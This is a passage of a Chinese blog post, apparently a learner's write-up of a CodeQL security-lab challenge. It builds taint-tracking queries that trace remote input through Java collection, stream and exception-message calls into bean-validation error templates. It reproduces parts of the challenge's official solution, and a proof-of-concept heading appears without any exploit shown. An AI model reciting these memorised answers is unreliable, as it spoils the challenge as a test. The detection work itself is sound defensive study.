    <span class="token keyword">exists</span><span class="token punctuation">(</span>ConstructorCall <span class="token keyword">call</span> <span class="token operator">|</span> <span class="token keyword">call</span><span class="token punctuation">.</span>getConstructedType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getSourceDeclaration<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"java.util"</span><span class="token punctuation">,</span> <span class="token string">"HashSet"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
      <span class="token number">f</span><span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">call</span><span class="token punctuation">.</span>getAnArgument<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span>
      t<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">call</span>
    <span class="token punctuation">)</span>
  }
}

<span class="token comment" spellcheck="true">// x -> y.RetainAll(x)</span>
class CollectionRetainAllTaintStep extends TaintTracking::AdditionalTaintStep {
  override predicate step<span class="token punctuation">(</span>DataFlow::Node <span class="token number">f</span><span class="token punctuation">,</span> DataFlow::Node t<span class="token punctuation">)</span> {
    <span class="token keyword">exists</span><span class="token punctuation">(</span>MethodAccess ma <span class="token operator">|</span> ma<span class="token punctuation">.</span>getMethod<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getDeclaringType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getASourceSupertype<span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hasQualifiedName<span class="token punctuation">(</span><span class="token string">"java.util"</span><span class="token punctuation">,</span> <span class="token string">"Collection"</span><span class="token punctuation">)</span> <span class="token operator">and</span>
      <span class="token number">f</span><span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> ma<span class="token punctuation">.</span>getAnArgument<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">and</span>
      t<span class="token punctuation">.</span>asExpr<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> ma<span class="token punctuation">.</span>getQualifier<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span>
  }
}
</code></pre>
<p>实际上就是从完成了这个函数的从source到sink。。。突然感觉有点迷。主要是debug那段不会搞跳过了就没怎么理解</p>
<pre class=" language-java"><code class="language-java">    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isValid</span><span class="token punctuation">(</span>Container container<span class="token punctuation">,</span> ConstraintValidatorContext context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>container <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        Set<span class="token operator">&lt;</span>String<span class="token operator">></span> common <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>container<span class="token punctuation">.</span><span class="token function">getSoftConstraints</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        common<span class="token punctuation">.</span><span class="token function">retainAll</span><span class="token punctuation">(</span>container<span class="token punctuation">.</span><span class="token function">getHardConstraints</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>common<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        context<span class="token punctuation">.</span><span class="token function">buildConstraintViolationWithTemplate</span><span class="token punctuation">(</span>
                <span class="token string">"Soft and hard constraints not unique. Shared constraints: "</span> <span class="token operator">+</span> common
        <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addConstraintViolation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">disableDefaultConstraintViolation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>其实也就是连上了这里面的两句。。。</p>
<h3 id="Step-2-Second-Issue"><a href="#Step-2-Second-Issue" class="headerlink" title="Step 2: Second Issue"></a>Step 2: Second Issue</h3><p>刚才找出来的链是在<code>SchedulingConstraintSetValidator.java</code>，而在<code>SchedulingConstraintValidator.java</code>中也存在类似的调用，补上对应的连接类</p>
<blockquote>
<p><strong>Tip</strong>: We don’t like duplicate code. ;-)</p>
</blockquote>
<p>意思就是写之前的全局类进行连接咯？</p>
<pre class=" language-java"><code class="language-java">    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isValid</span><span class="token punctuation">(</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> value<span class="token punctuation">,</span> ConstraintValidatorContext context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        Set<span class="token operator">&lt;</span>String<span class="token operator">></span> namesInLowerCase <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>String<span class="token operator">:</span><span class="token operator">:</span>toLowerCase<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>Collectors<span class="token punctuation">.</span><span class="token function">toSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        HashSet<span class="token operator">&lt;</span>String<span class="token operator">></span> unknown <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>namesInLowerCase<span class="token punctuation">)</span><span class="token punctuation">;</span>
        unknown<span class="token punctuation">.</span><span class="token function">removeAll</span><span class="token punctuation">(</span>JobConstraints<span class="token punctuation">.</span>CONSTRAINT_NAMES<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>unknown<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        context<span class="token punctuation">.</span><span class="token function">buildConstraintViolationWithTemplate</span><span class="token punctuation">(</span><span class="token string">"Unrecognized constraints "</span> <span class="token operator">+</span> unknown<span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">addConstraintViolation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">disableDefaultConstraintViolation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>他的函数长这样，那么就是把stream，map，collect函数连一下就行了吧<br>补充如下代码</p>
<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// x -> x.stream()</span>
<span class="token keyword">class</span> <span class="token class-name">CollectionStreamTaintStep</span> <span class="token keyword">extends</span> <span class="token class-name">TaintTracking</span><span class="token operator">:</span><span class="token operator">:</span>AdditionalTaintStep <span class="token punctuation">{</span>
  override predicate <span class="token function">step</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node f<span class="token punctuation">,</span> DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node t<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">exists</span><span class="token punctuation">(</span> MethodAccess ma<span class="token operator">|</span> ma<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"stream"</span> and
    ma<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getASourceSupertype<span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasQualifiedName</span><span class="token punctuation">(</span><span class="token string">"java.util"</span><span class="token punctuation">,</span> <span class="token string">"Collection"</span><span class="token punctuation">)</span> and
    f<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> ma<span class="token punctuation">.</span><span class="token function">getQualifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span> and 
    t<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> ma<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>


<span class="token comment" spellcheck="true">// x -> x.map()</span>
<span class="token keyword">class</span> <span class="token class-name">MapTaintStep</span> <span class="token keyword">extends</span> <span class="token class-name">TaintTracking</span><span class="token operator">:</span><span class="token operator">:</span>AdditionalTaintStep <span class="token punctuation">{</span>
  override predicate <span class="token function">step</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node f<span class="token punctuation">,</span> DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node t<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">exists</span><span class="token punctuation">(</span>MethodAccess ma <span class="token operator">|</span> ma<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"map"</span> and
    ma<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getASourceSupertype<span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasQualifiedName</span><span class="token punctuation">(</span><span class="token string">"java.util.stream"</span><span class="token punctuation">,</span> <span class="token string">"Stream"</span><span class="token punctuation">)</span> and
    f<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> ma<span class="token punctuation">.</span><span class="token function">getQualifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span> and
    t<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> ma <span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// x -> x.collect()</span>
<span class="token keyword">class</span> <span class="token class-name">CollectTaintStep</span> <span class="token keyword">extends</span> <span class="token class-name">TaintTracking</span><span class="token operator">:</span><span class="token operator">:</span>AdditionalTaintStep <span class="token punctuation">{</span>
  override predicate <span class="token function">step</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node f<span class="token punctuation">,</span> DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node t<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">exists</span><span class="token punctuation">(</span>MethodAccess ma <span class="token operator">|</span>  ma<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">"collect"</span> and
    ma<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getASourceSupertype<span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasQualifiedName</span><span class="token punctuation">(</span><span class="token string">"java.util.stream"</span><span class="token punctuation">,</span> <span class="token string">"Stream"</span><span class="token punctuation">)</span> and
    f<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> ma<span class="token punctuation">.</span><span class="token function">getQualifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span> and
    t<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> ma <span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>看了一眼答案，答案还是用的更为优雅的定义类的写法。。。下次一定改，然后hint中的减少重复代码就是因为map和collect这两个函数都是<code>java.util.stream.Stream</code>这个类的，所以再把这个类抽出来写一遍</p>
<p><code>f.asExpr() = ma.getQualifier() and t.asExpr() = ma</code><br>写最后一个函数的时候忘了这两句经典操作。。。导致查询除了问题可能进入了死循环，我当时还在想怎么这就十分钟都跑不出结果了。。。</p>
<h3 id="Step-3-Errors-and-Exceptions"><a href="#Step-3-Errors-and-Exceptions" class="headerlink" title="Step 3: Errors and Exceptions"></a>Step 3: Errors and Exceptions</h3><p>思路是因为这个模板渲染渲染的是报错，因此可能会有类似try catch的操作进行污点传递，需要使用额外的代码进行传递</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">{</span>
    <span class="token function">parse</span><span class="token punctuation">(</span>tainted<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">sink</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这段直接学习答案的例子了，思路比较清晰</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">ExceptionTaintStep</span> <span class="token keyword">extends</span> <span class="token class-name">TaintTracking</span><span class="token operator">:</span><span class="token operator">:</span>AdditionalTaintStep <span class="token punctuation">{</span>
  override predicate <span class="token function">step</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node n1<span class="token punctuation">,</span> DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node n2<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">exists</span><span class="token punctuation">(</span>Call call<span class="token punctuation">,</span> TryStmt <span class="token keyword">try</span><span class="token punctuation">,</span> CatchClause <span class="token keyword">catch</span><span class="token punctuation">,</span> MethodAccess getMessageCall <span class="token operator">|</span>
      <span class="token comment" spellcheck="true">// the call is within the `try` block, which has a corresponding `catch` clause</span>
      call<span class="token punctuation">.</span><span class="token function">getEnclosingStmt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getEnclosingStmt<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">try</span><span class="token punctuation">.</span><span class="token function">getBlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> and
      <span class="token keyword">try</span><span class="token punctuation">.</span><span class="token function">getACatchClause</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">catch</span> and
      <span class="token comment" spellcheck="true">// the `catch` clause is likely to catch an exception thrown by the call</span>
      <span class="token punctuation">(</span>
        <span class="token keyword">catch</span><span class="token punctuation">.</span><span class="token function">getACaughtType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getASupertype<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> call<span class="token punctuation">.</span><span class="token function">getCallee</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAThrownExceptionType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> or
        <span class="token keyword">catch</span><span class="token punctuation">.</span><span class="token function">getACaughtType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getASupertype<span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">TypeRuntimeException</span>
      <span class="token punctuation">)</span> and
      <span class="token comment" spellcheck="true">// the exception message is read by `getMessageCall` within the `catch` block</span>
      <span class="token keyword">catch</span><span class="token punctuation">.</span><span class="token function">getVariable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAnAccess</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> getMessageCall<span class="token punctuation">.</span><span class="token function">getQualifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span> and
      getMessageCall<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">regexpMatch</span><span class="token punctuation">(</span><span class="token string">"get(Localized)?Message|toString"</span><span class="token punctuation">)</span> and
      <span class="token comment" spellcheck="true">// taint flows from any argument of the call to a place where the exception message is accessed</span>
      n1<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> call<span class="token punctuation">.</span><span class="token function">getAnArgument</span><span class="token punctuation">(</span><span class="token punctuation">)</span> and
      n2<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> getMessageCall
    <span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里就两个地方没有很理解，一个是<code>call.getEnclosingStmt().getEnclosingStmt*()</code>，感觉可以直接+表示一次以上递归。没有很理解，然后就是函数名这里的正则<code>get(Localized)?Message|toString</code>，是java的错误处理函数命名规范吗？</p>
<p>那段对catch接受的错误与call抛出的错误的类型判断倒是一个很精彩的思路</p>
<h3 id="Step-4-Exploit-and-remediation"><a href="#Step-4-Exploit-and-remediation" class="headerlink" title="Step 4: Exploit and remediation"></a>Step 4: Exploit and remediation</h3><h4 id="Step-4-1-PoC"><a href="#Step-4-1-PoC" class="headerlink" title="Step 4.1: PoC"></a>Step 4.1: PoC</h4><p>怎么就快进到write a poc了。。。我还没找到用户输入在哪呢。再回头看一下用户输入追踪环节。是Step1.1的Bonus环节</p>
<h4 id="Step-1-1-Bonus"><a href="#Step-1-1-Bonus" class="headerlink" title="Step 1.1 Bonus"></a>Step 1.1 Bonus</h4><p>答案的类和各种函数定义的顺序还有点乱，理不清楚，看起来略微不适，并且语法都变了好多，不太看得懂了。。。</p>
<p>import了一个TaintTracking2并定义了一个新的Config</p>
<pre class=" language-java"><code class="language-java">  <span class="token keyword">class</span> <span class="token class-name">UserInputToValidatedFieldConfig</span> <span class="token keyword">extends</span> <span class="token class-name">TaintTracking2</span><span class="token operator">:</span><span class="token operator">:</span>Configuration <span class="token punctuation">{</span>
    <span class="token function">UserInputToValidatedFieldConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">this</span> <span class="token operator">=</span> <span class="token string">"UserInputToValidatedFieldConfig"</span> <span class="token punctuation">}</span>

    override predicate <span class="token function">isSource</span><span class="token punctuation">(</span>DataFlow2<span class="token operator">:</span><span class="token operator">:</span>Node source<span class="token punctuation">)</span> <span class="token punctuation">{</span> source <span class="token keyword">instanceof</span> <span class="token class-name">RemoteFlowSource</span> <span class="token punctuation">}</span>

    override predicate <span class="token function">isSink</span><span class="token punctuation">(</span>DataFlow2<span class="token operator">:</span><span class="token operator">:</span>Node sink<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      sink<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">any</span><span class="token punctuation">(</span>Field field<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAnAssignedValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
</code></pre>
<p>source是<code>RemoteFlowSource</code>，这个是codeql内置的类，表示远端的资源，然后sink就是一个赋值语句。这段很好理解</p>
<p>接下来的整体都比较玄幻，比较难再整合成一个语句了，尽可能的整合然后eval一下看看都是写什么东西</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">ConstraintAnnotation</span> <span class="token keyword">extends</span> <span class="token class-name">Annotation</span> <span class="token punctuation">{</span>
  <span class="token function">ConstraintAnnotation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasQualifiedName</span><span class="token punctuation">(</span><span class="token string">"javax.validation"</span><span class="token punctuation">,</span> <span class="token string">"Constraint"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>

  <span class="token comment" spellcheck="true">/** Holds if this constraint is validated by the class `validatorType`. */</span>
  predicate <span class="token function">isValidatedBy</span><span class="token punctuation">(</span>RefType validatorType<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    validatorType <span class="token operator">=</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token string">"validatedBy"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>ArrayInit<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>TypeLiteral<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTypeName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这个类寻找对应名称的注解，并提供一个函数寻找该注解中validatedBy属性对应的值（但是我并看不懂后面这堆操作在干什么。。。）</p>
<p>然后接下来定义了一个函数，但是实际上这个函数后面使用的时候第二个和第三个参数没有用？</p>
<pre class=" language-sql"><code class="language-sql">  <span class="token comment" spellcheck="true">/**
   * Holds if `validatedElement` is annotated with a validation constraint defined by `constraintType`,
   * which in turn is annotated with `constraintAnnotation` and validated by `validatorType`.
   */</span>
  predicate validatedConstraint<span class="token punctuation">(</span>
    Annotatable validatedElement<span class="token punctuation">,</span> RefType constraintType<span class="token punctuation">,</span> ConstraintAnnotation constraintAnnotation<span class="token punctuation">,</span>
    RefType validatorType
  <span class="token punctuation">)</span> {
    validatedElement<span class="token punctuation">.</span>getAnAnnotation<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getType<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> constraintType <span class="token operator">and</span>
    constraintType<span class="token punctuation">.</span>getAnAnnotation<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> constraintAnnotation <span class="token operator">and</span>
    constraintAnnotation<span class="token punctuation">.</span>isValidatedBy<span class="token punctuation">(</span>validatorType<span class="token punctuation">)</span>
  }
</code></pre>
<p>实际调用的时候是这样子的<code>validatedConstraint(validatedField, _, _, validatorType)</code><br>下划线表示any，也就是任意值，这个玩意的称呼似乎被称为don’t care var。意思是无用？那我能不能把这个函数之间缩成这样子的</p>
<pre class=" language-sql"><code class="language-sql">predicate validatedConstraint<span class="token punctuation">(</span>Annotatable validatedElement<span class="token punctuation">,</span> RefType validatorType<span class="token punctuation">)</span> {
  validatedElement<span class="token punctuation">.</span>getAnAnnotation<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getType<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getAnAnnotation<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span>ConstraintAnnotation<span class="token punctuation">)</span><span class="token punctuation">.</span>isValidatedBy<span class="token punctuation">(</span>validatorType<span class="token punctuation">)</span>
}
</code></pre>
<p>验证了一下确实可以，但这会导致结果有些跳脱，更加让人看不懂。使用原函数的quick eval就能看出该函数的思路，功能是寻找一个可被注解的对象，其注解的注解继承自<code>javax.validation.Constraint</code>类，寻找其isValidateBy值，该对象即会被isValidateBy指定类的isValid函数进行检验</p>
<p>然后写一个复杂函数</p>
<pre class=" language-java"><code class="language-java">predicate <span class="token function">validatesUserControlledBeanProperty</span><span class="token punctuation">(</span>
  Method isValidMethod<span class="token punctuation">,</span> Field validatedField<span class="token punctuation">,</span> RefType validatorType<span class="token punctuation">,</span>
  RemoteFlowSource remoteInput
<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment" spellcheck="true">// This `isValid` method is used to validate a field, or the field's class.</span>
  isValidMethod<span class="token punctuation">.</span>overridesOrInstantiates<span class="token operator">*</span><span class="token punctuation">(</span><span class="token function">any</span><span class="token punctuation">(</span>Method t <span class="token operator">|</span> t<span class="token punctuation">.</span><span class="token function">hasQualifiedName</span><span class="token punctuation">(</span><span class="token string">"javax.validation"</span><span class="token punctuation">,</span> <span class="token string">"ConstraintValidator"</span><span class="token punctuation">,</span> <span class="token string">"isValid"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> and
  validatorType <span class="token operator">=</span> isValidMethod<span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">and</span>
  <span class="token punctuation">(</span>
    <span class="token function">validatedConstraint</span><span class="token punctuation">(</span>validatedField<span class="token punctuation">,</span> validatorType<span class="token punctuation">)</span> or
    <span class="token function">validatedConstraint</span><span class="token punctuation">(</span>validatedField<span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>validatorType<span class="token punctuation">)</span>
  <span class="token punctuation">)</span> and
  <span class="token comment" spellcheck="true">// The value of the field is obtained from user input.</span>
  <span class="token function">any</span><span class="token punctuation">(</span>UserInputToValidatedFieldConfig config<span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">hasFlow</span><span class="token punctuation">(</span>remoteInput<span class="token punctuation">,</span> DataFlow<span class="token operator">:</span><span class="token operator">:</span><span class="token function">exprNode</span><span class="token punctuation">(</span>validatedField<span class="token punctuation">.</span><span class="token function">getAnAssignedValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<p>先找到符合要求的isValid函数，然后获取其对应类，然后寻找被该类注解的对象，最后将用户输入和被对应类注解的对象关联起来（要我说这个部分已经超出我的能力范围了。。。）</p>
<p>最后定义一个类，扩展DataFlow的Node类</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">BeanValidationSource</span> <span class="token keyword">extends</span> <span class="token class-name">DataFlow</span><span class="token operator">:</span><span class="token operator">:</span>Node <span class="token punctuation">{</span>
  <span class="token function">BeanValidationSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">exists</span><span class="token punctuation">(</span>Method isValidMethod <span class="token operator">|</span>
      <span class="token comment" spellcheck="true">// This source is the first parameter of the `isValid` method</span>
      isValidMethod<span class="token punctuation">.</span>overridesOrInstantiates<span class="token operator">*</span><span class="token punctuation">(</span><span class="token function">any</span><span class="token punctuation">(</span>Method t <span class="token operator">|</span> t<span class="token punctuation">.</span><span class="token function">hasQualifiedName</span><span class="token punctuation">(</span><span class="token string">"javax.validation"</span><span class="token punctuation">,</span> <span class="token string">"ConstraintValidator"</span><span class="token punctuation">,</span> <span class="token string">"isValid"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> and
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">asParameter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> isValidMethod<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> and
